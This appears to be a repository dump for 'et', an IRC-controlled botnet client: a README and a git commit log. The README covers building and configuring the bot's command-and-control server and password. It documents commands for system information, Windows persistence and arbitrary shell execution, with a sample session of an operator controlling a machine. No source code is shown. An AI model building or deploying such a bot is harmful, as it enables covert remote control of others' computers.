@@ -1,0 +1,513 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+et - the extraterrestrial botnet
+===
+
+### What is it?
+`et` is a dumb client to an IRC command-and-control server.
+
+When activated, it "phones home" and awaits instructions from members of an IRC channel.
+
+It can be instructed to retrieve system information and execute commands, among other things.
+
+### Compilation
+
+**IMPORTANT**: Many binary size reduction methods are not applied by default during *nix builds due to the wide variety of utilities/flags that provide that
+functionality on different systems. For example, standard symbol stripping (-s) is not applied because OS X no longer uses (-s) to strip symbols.
+To add your own size-optimization flags, either edit the makefile or feed them in by assigning to `LDFLAGS_NIX` while calling `make`.
+In addition, on Windows, you can try using a third-party tool like [UPX](http://upx.sourceforge.net/) to further reduce executable size.
+
+#### On *nix systems (Linux, BSD, OS X):
+```bash
+$ git clone https://github.com/woodruffw/et && cd et
+$ make nix # compiles et in ./bin
+```
+
+#### On Windows:
+Building on Windows requries `make` and `gcc`, both of which can be obtained through the [MinGW](http://www.mingw.org/) project.
+
+Download the tarball, extract it somewhere, and run `mingw32-make` inside of that directory in CMD.exe. The `et.exe` binary will be left in "bin".
+
+
+**IMPORTANT**: Do not actually run the resulting `et` binary, as it *WILL* open your computer to attack.
+
+### Configuration
+
+Many of `et`'s features can be configured in the *cnc_info.h* file under *./src*.
+
+For example:
+```C
+#define IRC_SERVER "irc.example.com"
+#define IRC_PORT 6667
+#define IRC_CHANNEL "#yourchannel"
+#define IRC_REPORT "hello!"
+#define IRC_AUTH "super secret password"
+```
+
+Any changes made require recompilation.
+
+### Usage
+Controlling the `et` bots from the IRC server is very simple.
+
+When each bot connects, it sends out a channel-wide message of the format:
+```
+et0000000: et0000000 phoning home
+```
+
+From that point on, the bot is ready to receive commands. There are a few built-in commands:
+* `auth <password>` - Requests authorization to control the bot. If the password matches `IRC_AUTH` in *cnc_info.h*, authorization is granted.
+* `deauth` - Deauthorizes control of the bot unconditionally. Once deauthorized, the bot may not execute any command but `auth`.
+* `info` - Outputs a digest of system information. Supplied by `uname(3)` on Unix and Linux and `GetVersionEx`/`GetUserName` on Windows.
+* `popup <message>` - **CURRENTLY WINDOWS ONLY**. Display a popup message on the client's screen.
+* `persist` - **CURRENTLY WINDOWS ONLY**. Ensures that the `et` executable, if killed, will restart on the next login. 
+* `depersist` - **CURRENTLY WINDOWS ONLY**. Does the opposite of `persist`, removing `et`'s persistence after logout.
+* `kill` - Disconnects the bot from the IRC server. Unless scheduled otherwise on the system, the bot will never reconnect.
+
+Aside from these four commands, all other commands passed to an `et` are passed directly to `popen(3)` (`_popen()` on Windows).
+
+By default `deauth`, `info`, `kill`, and all other commands are restricted until the bot is authorized with `auth`.
+
+Some examples, all from the IRC prompt:
+```
+et0000000: et0000000 phoning home
+/msg et0000000 auth et-phone-home
+et0000000: Successfully authorized. et0000000 listening.
+/msg et0000000 info
+et0000000: [some information]
+/msg et0000000 pwd
+et0000000: [the current working directory]
+/msg et0000000 popup hello, i'm controlling your computer
+/msg et0000000 kill
+*et0000000 has quit ()
+```
+
+Currently, output from system commands is limited to approximately 512 characters. For more information on IRC's limitations, read [RFC 2812](http://tools.ietf.org/rfc/rfc2812.txt).
+
+**IMPORTANT**: Because I tested `et` with ngIRCd, I made a few assumptions about common server characteristics. For example, `et` will always respond to a `PING` with
+a `PONG` message containing the server's name, simply because that's the most common `PING`/`PONG` message. If you encounter timeout issues, it's probably because your IRC server
+sends a different `PING` message.
+
+### Proof of Concept
+The original PoC Python script can be found under *./src/poc/et.py*. Like the actual version, it does work and *WILL* expose your machine.
+
+### Theoretical Limits
+Because the IRC protocol limits nicks to 9 characters, only so many `et`s can operate within a single channel.
+
+By default, the first two characters of an `et`'s nick will always be 'et,' meaning that at most 10 million `et`s can exist within a channel.
+Furthermore, because I got lazy with the Windows version, the ID on Windows machines can only be in the range [0, (32768 << 8)] for a total number of 8,388,609 possible IDs on Windows.
+Of course, because the trailing numbers are pseudorandom and not sequential, the actual point of collision is likely to be much lower than 10 million (or 8,388,609 for that matter).
+On the other hand, `et` can be configured to "phone home" to other servers and channels, making the limit less relevant in practice.
+
+### TODO
+* Reduce binary size
+* Prevent Windows CMD popups
+* Add more built-in commands
+
+### Contributing
+
+`et` is licensed under the MIT licence. 
+
+Please feel free to issue merge requests, even for small things. I appreciate all contributions.
+====================== GIT HISTORY: ======================
+e4a69f9 HEAD@{0}: clone: from https://github.com/woodruffw/et
+commit e4a69f9266203c94e19c822932e0715611d5d72d
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sun Aug 24 12:55:38 2014 -0400
+
+    fixed pingpong bug (hopefully), updated readme
+
+commit 4122824343d2abd36928d8c5f2d7c6180a27aaee
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 23 13:20:23 2014 -0400
+
+    permissions changes, added trailing newlines
+
+commit 6d702d4fd8248320aba3fbb50c4807c64fbb8530
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 23 13:10:23 2014 -0400
+
+    formatting change
+
+commit 38758728846f769f3894ea66c525fa9ca231f461
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 21 17:39:46 2014 -0400
+
+    removed msvc pragmas (unused)
+
+commit 2d53f52e398af803a645b7c52848fc8ed7526870
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 21 17:29:53 2014 -0400
+
+    more variable reduction, updated bins
+
+commit e9fa5f7123f3163fa611efc1bf931190e7fa7a35
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Wed Aug 20 12:28:11 2014 -0400
+
+    update TODO
+
+commit a7f286bd7e8fe97fadecefc8a5c6cb5fc7cee587
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Wed Aug 20 12:02:59 2014 -0400
+
+    fixed include order for bsd, added const to quit str on win
+
+commit dbbe88fd848526491a09f76c0ba5c92f2e7e60a7
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Wed Aug 20 11:40:01 2014 -0400
+
+    update makefile, replace variables with single var, update exe
+
+commit 4100e9d3d5d2fbf14501cc35c148d665edcc9ee5
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Wed Aug 20 11:23:02 2014 -0400
+
+    removed unneeded variables
+
+commit 7f890abda3a0235fc8d701ff661b48243663a245
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Wed Aug 20 11:13:54 2014 -0400
+
+    added persist/depersist placeholders on nix
+
+commit 764a38aa94d0b9e99784ec22989d492199b030a8
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Mon Aug 18 02:00:26 2014 -0400
+
+    update readme
+
+commit fcff77a7dd51c46351befb08deb0838340139906
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Mon Aug 18 01:46:37 2014 -0400
+
+    reformatting
+
+commit 15ada1b7c5870d148332002823b4601e17949912
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Mon Aug 18 00:57:01 2014 -0400
+
+    changed RegDeleteKeyEx -> RegDeleteKey for XP compat
+
+commit 68f1351588585372c78f5cba62da72bf18647d2d
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Mon Aug 18 00:49:09 2014 -0400
+
+    added depersist builtin on win, updated exe
+
+commit c12ad37de0230398f545158a61d9a0dc399b35c1
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sun Aug 17 23:46:34 2014 -0400
+
+    added persist command to win, updated readme/exe
+
+commit 5825ed17e4e5273d3acec68a19b27f07e95e92f4
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sun Aug 17 12:22:52 2014 -0400
+
+    updated windows exe
+
+commit 445449e3c7e3ed9ad331559ea6ed3d9a08f71507
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 16 16:46:48 2014 -0400
+
+    made irc message limits stricter and more standard
+
+commit 6ef4007bc800a3ba9c211341a0b44cab6bca9b9e
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 16 14:25:37 2014 -0400
+
+    fixed stupid mistake
+
+commit 8cde7a2f4936dd27f84cd580cbd8aedca30a5e08
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 16 14:06:46 2014 -0400
+
+    added username detect to info builtin on win
+
+commit c185e8b9ba6ca8e3fe7f52370c36f997b0417a55
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 16 13:31:01 2014 -0400
+
+    squished variables
+
+commit 49eda87e079bac87e10faa621e67df881f69cf81
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 14 01:28:50 2014 -0400
+
+    updated readme/makefile
+
+commit 93f8b8ea2821cac219530793d7bbc386c1502243
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 14 01:12:08 2014 -0400
+
+    updated readme, updated makefile, added const to var
+
+commit 2f1b8ccb25c74f7183782e2d8fe173d952c75209
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Tue Aug 12 17:33:44 2014 -0400
+
+    added memset
+
+commit 5809506ced338779e1d01355e17336bf7f8fc82a
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Tue Aug 12 17:24:28 2014 -0400
+
+    decreased binary size on windows significantly, fixed cmd bug
+
+commit fad9543ad8ee16748e72a5681d8fdca24ab6107b
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Tue Aug 12 15:17:23 2014 -0400
+
+    update todo
+
+commit b8115a55094290dfeb1a833e6df425d8cbfd7e6f
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Tue Aug 12 15:16:29 2014 -0400
+
+    added error msg for popup command on nix
+
+commit e4f97441806f0d76db1e26009bd94f7b1489ff17
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Tue Aug 12 15:08:00 2014 -0400
+
+    added popup command on windows, updated readme, updated bins
+
+commit b0d28d5c6279fb773793d1aec016c9b91237c893
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 9 22:58:44 2014 -0400
+
+    removed pointless ifdefs, updated exe
+
+commit fad59f973a1f6c8e025a5bcda9f2bf99cc8d1128
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 9 18:11:33 2014 -0400
+
+    added cpp conditionals for Windows Server 2003/8
+
+commit 46864aa41ce7d60590be2f65641e5e93abc7c2b8
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 9 18:02:53 2014 -0400
+
+    removed superfluous header files
+
+commit 4ac67bce77d6654c0452025606adee3d4cd564e1
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Sat Aug 9 13:14:14 2014 -0400
+
+    updated win exe
+
+commit cd5bd77064d6eb5c9f9391cba6294ed04b3db127
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 8 00:02:46 2014 -0400
+
+    revert generic url, update bin
+
+commit a21cd50e9d475a8c46ffa7f1e0d743e420a39667
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 7 21:16:11 2014 -0400
+
+    updated readme
+
+commit f3516686d73cd36748c3747c2b0d2180f29a6997
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 7 21:00:01 2014 -0400
+
+    fixed readme formatting, updated bin
+
+commit 8e65ca01c1b50dad611fa61a7b8ea2cc8f218f29
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 7 20:57:32 2014 -0400
+
+    replaced sprintf calls with _snprintf calls
+
+commit 28e76611e13cf72325f54cd6b90d91f6f33de7e4
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Aug 7 20:28:28 2014 -0400
+
+    made config generic, added examples to readme
+
+commit e551078422eb4380da70f63a29f682e07888d6c5
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 20:19:19 2014 -0400
+
+    replace quit with more accurate kill
+
+commit ea81e39f5b57d4c787ee1b4bff5b251a6bc0e6d5
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 20:16:24 2014 -0400
+
+    added contrib section, replaced pounds with zeroes
+
+commit f399498a1ee1e905d8f384cb0e1b2bbd605b8322
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 19:03:05 2014 -0400
+
+    remove redundant casts
+
+commit 29beb11a4cbc4389f5d53d241f147434ed03ad01
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 18:42:04 2014 -0400
+
+    fixed buffer overflow on too large output
+
+commit 3889a8e9a5256b540107fd835d4d8eb7a65c52a1
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 18:17:52 2014 -0400
+
+    added TODO to readme, updated osx bin
+
+commit 028a69c824e0f2888c1ef8b420ba0914836c4302
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 18:02:34 2014 -0400
+
+    fixed output, updated bins
+
+commit 4cb2c6b7154ae71d8fe2b8d9a9f0ff9b0745c650
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 13:36:18 2014 -0400
+
+    added basic auth to windows
+
+commit 55c44f6ef63279b8d3dafefd16e7924ddfde9734
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Fri Aug 1 13:15:36 2014 -0400
+
+    added basic auth mode for nix, updated readme
+
+commit 2ce2caa4d5d7e3a545fa035d6feb5a3cd6cb4458
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 18:08:15 2014 -0400
+
+    added comments
+
+commit a8bc5845ec6f5a60970a9538088aa001fdf80756
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 17:10:56 2014 -0400
+
+    update readme
+
+commit 584454f68c7b6a8aa8e032163d7ae53342278e9c
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 16:34:03 2014 -0400
+
+    rem exe
+
+commit 91ee3b5bbfbe826cbfc21bf6337b2741ad0afaa0
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 16:33:46 2014 -0400
+
+    began implementing windows main loop
+
+commit 6e5835192539caacaa1e9c0a1873437e2ef43ac1
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 15:48:17 2014 -0400
+
+    remove exe
+
+commit 325b05461040f1ce57a2a8f2723027933aa93583
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 15:48:00 2014 -0400
+
+    began windows work, updated comments and readme
+
+commit faf2529bdf0470c4112776b420f56d139c280707
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 13:13:29 2014 -0400
+
+    tidied up snprintfs
+
+commit 5f5fcd441d1aa2197729648090cd2621d6df3b49
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 13:06:53 2014 -0400
+
+    update readme, clean up info command
+
+commit 724813dab9958b4338a34dc9e11997c4778b9a48
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 12:51:11 2014 -0400
+
+    moved quit msg
+
+commit b4ed06a6ba3c83fcfe6a13b29ffa92ede2bec8bd
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 12:41:52 2014 -0400
+
+    added fork
+
+commit e03df6315695fec0b3abd3537acb36b859007602
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 12:12:34 2014 -0400
+
+    added info cmd
+
+commit 69f30f3f60700f5f562cc9f38e8a8c7ae354c6d0
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 11:01:13 2014 -0400
+
+    rename main_loop, added uname
+
+commit ff0900c74ea653bcc24d5bd8f345ca32075292c5
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 02:18:56 2014 -0400
+
+    fixed add
+
+commit c52a06438d090313bc1c47ffdc1a9d8707e0f5a4
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 02:18:06 2014 -0400
+
+    added the original proof of concept, updated readme
+
+commit 20944b38095b5ce4481eaf1959166ff211aaf764
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 01:53:16 2014 -0400
+
+    fix include
+
+commit 9ffc79ea78c48c79f9aad2b8a85027bb4638ff33
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 01:52:28 2014 -0400
+
+    move loop files
+
+commit ddec07af3dfc5e4b0de7650db1be7c83183e00a4
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 01:51:53 2014 -0400
+
+    moved main loop, changed makefile
+
+commit 6b30c46c0847637e10869a0c908b430e4708853c
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 01:44:10 2014 -0400
+
+    fixed cc warnings, added newlines
+
+commit ec273d54b75f1e5e82309388e31abb2ad43c1a23
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 01:32:33 2014 -0400
+
+    fixed pingpong
+
+commit fc5e2af70860f7a8883949e55bd6fcd0d2de64ab
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 01:29:16 2014 -0400
+
+    added et_main_loop, adjusted makefile
+
+commit 8673534759c6e7ea6e2ad3ca6473ede814a627a7
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 00:09:27 2014 -0400
+
+    added some comments
+
+commit d9ac36fbe84a86ddc81aa28d6cad638cdd3fca81
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Thu Jul 31 00:02:58 2014 -0400
+
+    remove bin, update readme
+
+commit 64219f8fabef5a2afe6850ad9102309901906bcb
+Author: William Woodruff <william@tuffbizz.com>
+Date:   Wed Jul 30 23:54:32 2014 -0400
+
+    init commit
